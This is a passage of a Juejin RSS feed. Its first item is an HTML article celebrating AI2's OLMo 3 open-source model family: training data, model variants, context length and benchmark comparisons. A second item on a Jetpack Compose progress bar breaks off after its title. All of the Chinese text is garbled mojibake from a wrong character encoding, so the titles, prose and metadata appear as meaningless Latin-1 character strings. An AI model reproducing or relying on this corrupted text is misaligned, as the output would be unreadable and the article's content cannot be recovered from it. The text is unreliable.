<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[å¼€æ”¾è‡³æè‡´ï¼šOLMo 3å¦‚ä½•é‡å¡‘å¼€æºå¤§æ¨¡å‹æ¸¸æˆè§„åˆ™ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7576124206397947914</link>    <guid>https://juejin.cn/post/7576124206397947914</guid>    <pubDate>2025-11-24T14:15:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576124206397947914" data-draft-id="7576124206397931530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€æ”¾è‡³æè‡´ï¼šOLMo 3å¦‚ä½•é‡å¡‘å¼€æºå¤§æ¨¡å‹æ¸¸æˆè§„åˆ™ï¼Ÿ"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-11-24T14:15:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€æ”¾è‡³æè‡´ï¼šOLMo 3å¦‚ä½•é‡å¡‘å¼€æºå¤§æ¨¡å‹æ¸¸æˆè§„åˆ™ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:15:14.000Z" title="Mon Nov 24 2025 14:15:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025å¹´11æœˆ20æ—¥ï¼ŒAIåœˆæ³¨å®šè¦è®°ä½è¿™ä¸ªæ—¥å­ã€‚è‰¾ä¼¦äººå·¥æ™ºèƒ½ç ”ç©¶æ‰€ï¼ˆAI2ï¼‰æ‚„ç„¶æŠ•ä¸‹äº†ä¸€é¢—é‡ç£…ç‚¸å¼¹ï¼šå…¶æ–°ä¸€ä»£å¼€æºå¤§è¯­è¨€æ¨¡å‹ç³»åˆ—â€”â€”<strong>OLMo 3</strong>æ­£å¼é¢ä¸–ã€‚è¯´å®ƒâ€œé‡ç£…â€ï¼Œç»ä¸ä»…ä»…æ˜¯å› ä¸ºåˆå¤šäº†ä¸€æ¬¾å‚æ•°è§„æ¨¡æ›´å¤§çš„æ¨¡å‹ï¼Œè€Œæ˜¯å› ä¸ºå®ƒå½»åº•é¢ è¦†äº†æˆ‘ä»¬å¯¹â€œå¼€æºâ€çš„ç†è§£ï¼Œä¸ºæ•´ä¸ªè¡Œä¸šæ ‘ç«‹äº†æ€§èƒ½ã€æ•ˆç‡å’Œé€æ˜åº¦çš„æ–°æ ‡æ†ã€‚</p>
<p>ä½œä¸ºä¸€åå…³æ³¨AIå‰æ²¿çš„åˆ›ä½œè€…ï¼Œæˆ‘æ·±çŸ¥å¼€æºç¤¾åŒºå¯¹å¤§æ¨¡å‹çš„æ¸´æœ›ï¼Œä¸ä»…ä»…æ˜¯æ‹¿åˆ°æ¨¡å‹æƒé‡ï¼Œæ›´æ˜¯å¸Œæœ›èƒ½å¤Ÿæ´å¯Ÿå…¶å†…éƒ¨æœºåˆ¶ï¼Œè¿›è¡Œæ·±åº¦å®šåˆ¶å’Œç ”ç©¶ã€‚è€ŒOLMo 3çš„åˆ°æ¥ï¼Œæ­£æ˜¯å¯¹è¿™ç§æ¸´æœ›çš„æè‡´å›åº”ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.27-1024x537.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.27-1024x537.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f57080221324b83b30bd47df0c9da69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=jyjwWNt9RilWTcxl4AgameIpfRo%3D" alt="iShot_2025-11-24_22.06.27" loading="lazy"/></a></p>
<h3 data-id="heading-0">çªç ´â€œé»‘ç®±â€ï¼šå…¨æ ˆå¼€æºçš„éœ‡æ’¼å®£è¨€</h3>
<p>ä»¥å¾€æˆ‘ä»¬è°ˆè®ºå¼€æºæ¨¡å‹ï¼Œå¾€å¾€æŒ‡çš„æ˜¯æ¨¡å‹æƒé‡å’Œä¸€äº›åŸºæœ¬ä»£ç ã€‚ä½†OLMo 3ï¼Œå¦‚åŒå…¶åâ€œOpen Language Modelâ€çš„ç»ˆææ¼”ç»ï¼Œç›´æ¥å°†â€œé€æ˜åº¦â€æå‡åˆ°äº†å‰æ‰€æœªæœ‰çš„é«˜åº¦ã€‚AI2è¿™æ¬¡ç©å¾—æ›´å¤§ï¼Œä»–ä»¬å¼€æ”¾çš„æ˜¯å®Œæ•´çš„â€œ<strong>æ¨¡å‹æµç¨‹ï¼ˆModel Flowï¼‰</strong>â€ã€‚</p>
<p>è¿™æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ ä¸å†åªæ˜¯æ‹¿åˆ°äº†ä¸€å¼ ç²¾ç¾çš„è›‹ç³•ï¼Œè€Œæ˜¯è·å¾—äº†ä»é¢ç²‰ã€é¸¡è›‹åˆ°çƒ˜ç„™é£Ÿè°±ã€åˆ¶ä½œè¿‡ç¨‹ä¸­çš„æ¯ä¸€ä¸ªæ£€æŸ¥ç‚¹ï¼Œç”šè‡³è¿ä½ ä½¿ç”¨çš„çƒ¤ç®±å‹å·å’Œæ¸©åº¦æ›²çº¿éƒ½ä¸€æ¸…äºŒæ¥šã€‚OLMo 3å°±æ˜¯è¿™æ ·çš„â€œè›‹ç³•â€ï¼šå®ƒä¸ä»…æä¾›70äº¿å’Œ320äº¿ä¸¤ç§å‚æ•°è§„æ¨¡çš„æ¨¡å‹æƒé‡ï¼Œæ›´æ…·æ…¨åœ°å¼€æºäº†ï¼š</p>
<ul>
<li><strong>å®Œæ•´çš„è®­ç»ƒæ•°æ®é›† Dolma 3ï¼š</strong> è¿™æ˜¯ä¸€ä¸ªè§„æ¨¡é«˜è¾¾çº¦6ä¸‡äº¿tokençš„åºå¤§æ•°æ®é›†ï¼ŒåŒ…å«äº†ç½‘é¡µã€ç§‘å­¦PDFã€ä»£ç åº“ç­‰ä¸°å¯Œå†…å®¹ã€‚ä½ èƒ½ç›´æ¥çœ‹åˆ°æ¨¡å‹â€œåƒâ€äº†ä»€ä¹ˆã€‚</li>
<li><strong>è®­ç»ƒä»£ç ä¸è¯¦ç»†é…æ–¹ï¼š</strong> ä½ å¯ä»¥å®Œå…¨å¤ç°å…¶è®­ç»ƒè¿‡ç¨‹ã€‚</li>
<li><strong>å„é˜¶æ®µçš„è®­ç»ƒæ£€æŸ¥ç‚¹ï¼š</strong> æ·±å…¥åˆ†ææ¨¡å‹æ˜¯å¦‚ä½•ä¸€æ­¥æ­¥è¿›åŒ–è€Œæ¥ã€‚</li>
</ul>
<p>è¿™ç§â€œå…¨æ ˆå¼€æºâ€çš„å“²å­¦ï¼Œå¯¹äºå­¦æœ¯ç ”ç©¶ã€æ¨¡å‹è°ƒè¯•å’Œè´Ÿè´£ä»»AIçš„å‘å±•è€Œè¨€ï¼Œç®€ç›´æ˜¯ç¦éŸ³ã€‚å®ƒè®©å¤§æ¨¡å‹ä¸å†æ˜¯é«˜é«˜åœ¨ä¸Šçš„â€œé»‘ç®±â€ï¼Œè€Œæ˜¯å¯ä»¥è¢«æ·±å…¥å‰–æã€ç†è§£å’Œå†åˆ›é€ çš„ç§‘å­¦å·¥å…·ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.50-1024x535.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.50-1024x535.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25135e302cf84115b4e6e71edcd072f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=7ShK0nJ2XaAUYb1jkRkWS5j8baI%3D" alt="iShot_2025-11-24_22.06.50" loading="lazy"/></a></p>
<h3 data-id="heading-1">æ€§èƒ½ä¸æ•ˆç‡çš„â€œåŒæ–™å† å†›â€</h3>
<p>é€æ˜åº¦ä¹‹å¤–ï¼Œæ€§èƒ½å’Œæ•ˆç‡æ˜¯è¡¡é‡å¤§æ¨¡å‹çš„ç¡¬æŒ‡æ ‡ã€‚OLMo 3åœ¨è¿™ä¸¤ç‚¹ä¸Šä¹Ÿäº¤å‡ºäº†ä»¤äººæƒŠå–œçš„ç­”å·ã€‚</p>
<p>æ ¹æ®å®˜æ–¹æ•°æ®ï¼ŒOLMo 3åŸºç¡€æ¨¡å‹çš„è®­ç»ƒæ•ˆç‡æ¯”åŒè§„æ¨¡çš„Meta Llama 3.1é«˜å‡ºæƒŠäººçš„2.5å€ã€‚è¿™èƒŒåæ˜¯AI2åœ¨è®­ç»ƒæ•°æ®æ··åˆã€æ¨¡å‹æ¶æ„å’Œä¼˜åŒ–ç­–ç•¥ä¸Šçš„æ·±åº¦æ¢ç´¢ã€‚æ›´ä»¤äººéœ‡æ’¼çš„æ˜¯ï¼Œå…¶32Bè§„æ¨¡çš„â€œThinkâ€æ¨¡å‹ï¼Œåœ¨æ€§èƒ½ä¸Šè¶³ä»¥å¯¹æ ‡ç”šè‡³è¶…è¶ŠQwen 3 32Bè¿™æ ·çš„ä¸šç•Œç¿˜æ¥šï¼Œä½†è®­ç»ƒæ‰€ç”¨çš„tokenæ•°é‡å´ä»…ä¸ºåè€…çš„å…­åˆ†ä¹‹ä¸€ã€‚è¿™æ„å‘³ç€ï¼ŒAI2åœ¨æ›´å°‘çš„èµ„æºæ¶ˆè€—ä¸‹ï¼Œè¾¾åˆ°äº†åŒç­‰ç”šè‡³æ›´é«˜çš„æ€§èƒ½ï¼Œè¿™æ— ç–‘æ˜¯æ•ˆç‡ä¼˜åŒ–é¢†åŸŸçš„ä¸€å¤§çªç ´ã€‚</p>
<p>åœ¨å®é™…åŸºå‡†æµ‹è¯•ä¸­ï¼ŒOLMo 3å®¶æ—åœ¨å¤šé¡¹ç»¼åˆèƒ½åŠ›æµ‹è¯•ä¸­ï¼Œä¸Qwen 2.5ã€Gemma 3ã€Llama 3.1ç­‰ä¸»æµå¼€æºæ¨¡å‹å¹³åˆ†ç§‹è‰²ï¼Œç”šè‡³åœ¨æŸäº›åœºæ™¯ä¸‹è¡¨ç°æ›´ä¸ºå‡ºè‰²ã€‚å°¤å…¶åœ¨é•¿ä¸Šä¸‹æ–‡ç†è§£å’Œä»£ç èƒ½åŠ›æ–¹é¢ï¼ŒOLMo 3å±•ç°å‡ºç‹¬ç‰¹çš„ä¼˜åŠ¿ï¼Œä¸é¡¶çº§æ¨¡å‹ä¸ç›¸ä¸Šä¸‹ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.06.54-1024x319.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.06.54-1024x319.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/343d12185a0e49a1a761c9c74df4c191~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=NbrPuL6XbRR1hru4ctuRDHBCs7c%3D" alt="iShot_2025-11-24_22.06.54" loading="lazy"/></a></p>
<h3 data-id="heading-2">ä¸ºåº”ç”¨åœºæ™¯é‡èº«å®šåˆ¶çš„â€œæ¨¡å‹å®¶æ—â€</h3>
<p>OLMo 3å¹¶éå•æ‰“ç‹¬æ–—ï¼Œè€Œæ˜¯ä¸€ä¸ªåˆ†å·¥æ˜ç¡®çš„å®¶æ—ï¼Œæ¯ä¸ªæˆå‘˜éƒ½é’ˆå¯¹ç‰¹å®šä»»åŠ¡è¿›è¡Œäº†ä¼˜åŒ–ï¼š</p>
<ul>
<li><strong>OLMo 3 Baseï¼ˆ7B/32Bï¼‰ï¼š</strong> çº¯ç²¹çš„åŸºç¡€æ¨¡å‹ï¼Œæ˜¯é‚£äº›å¸Œæœ›ä»é›¶å¼€å§‹å®šåˆ¶æˆ–è¿›è¡Œé¢†åŸŸé€‚é…çš„å¼€å‘è€…å’Œç ”ç©¶è€…çš„å®Œç¾èµ·ç‚¹ã€‚</li>
<li><strong>OLMo 3 Thinkï¼ˆ7B/32Bï¼‰ï¼š</strong> è¿™æ¬¾æ¨¡å‹å…·å¤‡æ˜¾å¼çš„æ€ç»´é“¾ï¼ˆChain-of-Thoughtï¼‰èƒ½åŠ›ï¼Œæ¨ç†è¿‡ç¨‹é€æ˜ï¼Œæ˜¯å¤„ç†å¤æ‚é€»è¾‘åˆ†æã€æ•°å­¦è®¡ç®—å’Œä»£ç ç”Ÿæˆçš„ç†æƒ³é€‰æ‹©ã€‚å¦‚æœä½ éœ€è¦ä¸€ä¸ªèƒ½â€œæ€è€ƒâ€çš„æ¨¡å‹ï¼Œéå®ƒè«å±ã€‚</li>
<li><strong>OLMo 3 Instructï¼ˆ7Bï¼‰ï¼š</strong> è½»é‡è€Œå¼ºå¤§ï¼Œå®ƒé’ˆå¯¹æŒ‡ä»¤éµå¾ªã€å¤šè½®å¯¹è¯å’Œå·¥å…·è°ƒç”¨è¿›è¡Œäº†æ·±åº¦ä¼˜åŒ–ï¼Œæ— è®ºæ˜¯ä½œä¸ºæ—¥å¸¸æ™ºèƒ½åŠ©æ‰‹ï¼Œè¿˜æ˜¯åµŒå…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œéƒ½èƒ½æ¸¸åˆƒæœ‰ä½™ã€‚</li>
<li><strong>OLMo 3 RL Zeroï¼ˆ7Bï¼‰ï¼š</strong> è¿™æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºå¼ºåŒ–å­¦ä¹ ï¼ˆRLï¼‰ç ”ç©¶è€…æ‰“é€ çš„â€œå¹²å‡€åº•åº§â€ã€‚å®ƒçš„è®­ç»ƒæ•°æ®ä¸é¢„è®­ç»ƒæ•°æ®åˆ†ç¦»ï¼Œä¸ºRLç®—æ³•çš„æ¢ç´¢æä¾›äº†æä½³çš„å¯æ§ç¯å¢ƒã€‚</li>
</ul>
<p>æ­¤å¤–ï¼ŒOLMo 3å…¨ç³»åˆ—æ¨¡å‹æ”¯æŒé«˜è¾¾<strong>65,000ä¸ªtoken</strong>çš„ä¸Šä¸‹æ–‡é•¿åº¦ï¼Œè¿™ç›¸å½“äºä¸€æ¬¡æ€§å¤„ç†ä¸€éƒ¨çŸ­ç¯‡å°è¯´ã€‚å¯¹äºéœ€è¦åˆ†æé•¿ç¯‡æ–‡æ¡£ã€æ³•å¾‹åˆåŒã€æŠ€æœ¯æŠ¥å‘Šç­‰ä»»åŠ¡çš„ç”¨æˆ·æ¥è¯´ï¼Œè¿™æ— ç–‘æ˜¯ä¸€é¡¹æå…·ä»·å€¼çš„çªç ´ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.07.04-1024x921.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.07.04-1024x921.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bb71e88d790407fa007ca162fec009d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=rLo4bal%2FBQqu9GsPRLmf%2F%2F7V6lU%3D" alt="iShot_2025-11-24_22.07.04" loading="lazy"/></a></p>
<h3 data-id="heading-3">è§¦æ‰‹å¯åŠçš„æœªæ¥</h3>
<p>AI2æ·±çŸ¥ï¼Œå†å¼ºå¤§çš„æ¨¡å‹ï¼Œä¹Ÿéœ€è¦ä¾¿æ·çš„è·å–å’Œä½¿ç”¨æ–¹å¼ã€‚å› æ­¤ï¼ŒOLMo 3ç³»åˆ—æ¨¡å‹æƒé‡å·²åœ¨Hugging Faceçš„<code>allenai/OLMo-3</code>é¡¹ç›®ä¸‹å…¨éƒ¨å¼€æºï¼Œæ–¹ä¾¿å¼€å‘è€…ç›´æ¥ä¸‹è½½ã€‚å¦‚æœä½ æƒ³å…ˆç¹ä¸ºå¿«ï¼ŒAI2å®˜æ–¹è¿˜æä¾›äº†æ¨¡å‹æ¸¸ä¹åœºï¼ˆPlaygroundï¼‰ï¼Œè®©ä½ æ— éœ€ä»»ä½•é…ç½®ï¼Œå³å¯åœ¨çº¿ä½“éªŒå„ä¸ªæ¨¡å‹çš„é­…åŠ›ã€‚</p>
<h3 data-id="heading-4">ç»“è¯­ï¼šæ–°æ—¶ä»£çš„å¼€æºå®£è¨€</h3>
<p>OLMo 3çš„å‘å¸ƒï¼Œä¸ä»…ä»…æ˜¯AI2åœ¨æŠ€æœ¯ä¸Šçš„ä¸€æ¬¡é£è·ƒï¼Œæ›´æ˜¯ä»–ä»¬å¯¹å¼€æºç²¾ç¥çš„æ·±åˆ»è¯ é‡Šã€‚å®ƒå‘ä¸–ç•Œå®£å‘Šï¼šé«˜æ€§èƒ½ä¸æè‡´é€æ˜å¹¶éä¸å¯å…¼å¾—ã€‚é€šè¿‡å¼€æ”¾â€œæ¨¡å‹æµç¨‹â€çš„æ¯ä¸€ä¸ªç¯èŠ‚ï¼ŒAI2ä¸ä»…æä¾›äº†å¼ºå¤§çš„å·¥å…·ï¼Œæ›´æ­å»ºäº†ä¸€ä¸ªå‰æ‰€æœªæœ‰çš„ç ”ç©¶åŸºç¡€è®¾æ–½ï¼Œæœ‰æœ›æå¤§æ¨åŠ¨AIç§‘å­¦çš„å¯å¤ç°æ€§å’Œåˆ›æ–°é€Ÿåº¦ã€‚</p>
<p>åœ¨è¿™ä¸ªAIæµªæ½®å¥”æ¶Œçš„æ—¶ä»£ï¼ŒOLMo 3æ— ç–‘æ˜¯å…¶ä¸­ä¸€é“äº®ä¸½çš„é£æ™¯çº¿ã€‚å®ƒä¸ä»…è®©æˆ‘ä»¬çœ‹åˆ°äº†æœªæ¥å¼€æºå¤§æ¨¡å‹çš„å½¢æ€ï¼Œä¹Ÿä¸ºæ•´ä¸ªAIç¤¾åŒºæŒ‡æ˜äº†ä¸€æ¡æ›´å¼€æ”¾ã€æ›´é€æ˜ã€æ›´é«˜æ•ˆçš„å‰è¿›ä¹‹è·¯ã€‚ä½œä¸ºAIåœˆçš„ä¸€å‘˜ï¼Œæˆ‘å¯¹æ­¤å……æ»¡æœŸå¾…ï¼Œå¹¶ç›¸ä¿¡å®ƒå°†åœ¨æœªæ¥çš„AIå‘å±•ä¸­æ‰®æ¼”ä¸¾è¶³è½»é‡çš„è§’è‰²ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F11%2FiShot_2025-11-24_22.07.13-1024x670.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/11/iShot_2025-11-24_22.07.13-1024x670.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aabef761a07248afb5f888ff8ce16d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598514&amp;x-signature=bMt6EUeYRCfMJYUuI4sqYleadjg%3D" alt="iShot_2025-11-24_22.07.13" loading="lazy"/></a></p>
<p><strong>å¦‚æœä½ ä¹Ÿå¯¹æœ€æ–°çš„AIä¿¡æ¯æ„Ÿå…´è¶£æˆ–è€…æœ‰ç–‘é—® éƒ½å¯ä»¥åŠ å…¥æˆ‘çš„å¤§å®¶åº­ ç¬¬ä¸€æ—¶é—´åˆ†äº«æœ€æ–°AIèµ„è®¯ã€å·¥å…·ã€æ•™ç¨‹ã€æ–‡æ¡£ æ¬¢è¿ä½ çš„åŠ å…¥ï¼ï¼ï¼ğŸ˜‰ğŸ˜‰ğŸ˜‰</strong></p>
<p>å…¬ä¼—å·ï¼šå¢¨é£å¦‚é›ªå°ç«™</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Jetpack Compose å®æˆ˜ï¼šå¤åˆ» Material 3 åœ†å½¢æ³¢æµªè¿›åº¦æ¡]]></title>    <link>https://juejin.cn/post/7575897635138060288</link>    <guid>https://juejin.cn/post/7575897635138060288</guid>    <pubDate>2025-11-24T14:18:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575897635138060288" data-draft-id="7575090551357603892" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Jetpack Compose å®æˆ˜ï¼šå¤åˆ» Material 3 åœ†å½¢æ³¢æµªè¿›åº¦æ¡"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2025-11-24T14:18:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ç™½"/> <meta itemprop="url" content="https://juejin.cn/user/2549135752044601"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Jetpack Compose å®æˆ˜ï¼šå¤åˆ» Material 3 åœ†å½¢æ³¢æµªè¿›åº¦æ¡
